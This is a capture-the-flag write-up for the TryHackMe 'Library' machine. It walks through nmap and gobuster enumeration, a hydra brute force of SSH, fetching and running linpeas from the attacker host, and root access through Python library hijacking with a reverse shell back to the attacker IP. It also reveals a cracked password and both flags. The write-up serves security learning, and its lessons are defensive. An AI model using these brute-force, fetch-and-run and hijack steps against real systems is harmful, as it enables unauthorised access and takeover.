# CTF Writeup: Library (TryHackMe)

**Date:** April 27, 2026

**Platform:** TryHackMe

**Difficulty:** Easy

**Focus:** Web Enumeration, SSH Bruteforcing, Python Library Hijacking

---

## 1. Introduction
Library is an easy-rated boot2root machine originally designed for the FIT and BSides Guatemala CTF. The path to root involves basic web enumeration to find valid usernames, an SSH brute-force attack for initial access, and exploiting a `sudo` misconfiguration using Python Library Hijacking to escalate privileges.

---

## 2. Reconnaissance & Enumeration

### Network Scanning
I started the reconnaissance phase with `nmap` to identify open ports. Since a full port scan (`nmap -p- 10.129.144.226`) was taking too long, I ran a fast basic scan (`nmap 10.129.144.226`) followed by a targeted service and script scan on the discovered ports:
```bash
nmap -sV --script=default -p 22,80 10.129.144.226
```
* **Port 22 (SSH):** OpenSSH 7.2p2
* **Port 80 (HTTP):** Apache httpd 2.4.18

### Web Discovery
Accessing the web server on port 80, I found a basic blog-style website filled primarily with dummy "Lorem Ipsum" text. 
* **Interaction:** I found a "Post a comment" form requiring a name, email, website, and comment. Submitting the form did not result in any visible changes.
* **Source & Assets:** Checking the page source and `master.css` revealed nothing unusual. 
* **User Identification:** Through exploring the website's posts and structure, I identified a legitimate, non-generated username: `meliodas`.

---

## 3. Information Gathering (OSINT & Advanced Enum)

1.  **Directory Brute-forcing:** I ran `gobuster` on the root web directory to uncover hidden paths:
    ```bash
    gobuster dir -u http://10.129.144.226/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x zip,txt,html,js,php
    ```
    * Findings included `/robots.txt`, `/images/`, and `index.html`. Unfortunately, none of these provided any actionable intelligence or hidden paths.

2.  **Web Attack Attempts (Dead Ends):**
    * Intercepted the "Post a comment" form via Burp Suite and attempted Server-Side Request Forgery (SSRF) via the website input. 
    * Set up a fake email server to test for email injection/responses via the email input field. Neither attempt was successful.

3.  **SSH Enumeration:** I attempted an OpenSSH username enumeration exploit, but it yielded a massive amount of false positives, rendering the output useless.

---

## 4. Initial Access

### SSH Brute-forcing
With a confirmed valid username (`meliodas`) and an exposed SSH service, I decided to brute-force the login using `hydra` and the standard `rockyou.txt` wordlist:

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.129.144.226 -t 4
```

The attack successfully cracked the credentials:
* **Username:** `meliodas`
* **Password:** `iloveyou1`

### User Flag
Logging in via SSH with the discovered credentials granted a user shell. I immediately retrieved the user flag:
* **User Flag:** `6d488cbb3f111d135722c33cb635f4ec`

---

## 5. Privilege Escalation

### Exploring the Filesystem & Enumeration
Inside the `meliodas` home directory, I found a python script named `bak.py`. I initially downloaded the generated backup file (`/var/backups/website.zip`) via `rsync`, but it was empty. 

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

To dig deeper, I hosted `linpeas.sh` on my attacker machine using python's HTTP server (`python3 -m http.server 2828`). I downloaded it to the target's `/dev/shm` directory and executed it:
```bash
cd /dev/shm && wget http://192.168.133.82:2828/linpeas.sh > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Sudo Misconfiguration & Library Hijacking
LinPEAS highlighted a critical piece of information:
1.  The home folder of `meliodas` is included in the `PATH`.

Spawning a new shell via SSH and checking `sudo -l`, it revealed the following misconfiguration:
    ` (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py`

This meant any user could run `bak.py` as root via python without requiring a password. 

Because `bak.py` imports the `zipfile` module, and the script is executed from the user's home directory, it is vulnerable to **Python Library Hijacking**. Python prioritizes the current working directory when looking for modules to import.

### Root Flag
I created a malicious script named `zipfile.py` in `/home/meliodas` containing a Python reverse shell pointing back to my attacker machine (`192.168.133.82` on port `2828`). 

After setting up a netcat listener (`nc -lvnp 2828`), I executed the vulnerable command:
```bash
sudo /usr/bin/python3 /home/meliodas/bak.py
```

The script executed, attempted to `import zipfile`, and triggered my malicious local file instead of the system library. I caught the reverse shell as `root` and retrieved the final flag:
* **Root Flag:** `e8c8c6c256c35515d1d344ee0488c617`

---

## 6. Lessons Learned
* **Weak Passwords:** Default or easily guessable passwords (like those in `rockyou.txt`) are a massive vulnerability. Implementing strong password policies or key-based SSH authentication is crucial.
* **Principle of Least Privilege:** Allowing users to run scripts as `root` without restriction or password verification easily leads to system compromise. 
* **Python Path/Library Hijacking:** When scripts are executed with elevated privileges, it's vital to secure the environment they run in. Attackers can hijack imports by placing malicious files matching the names of imported modules within the script's execution directory.
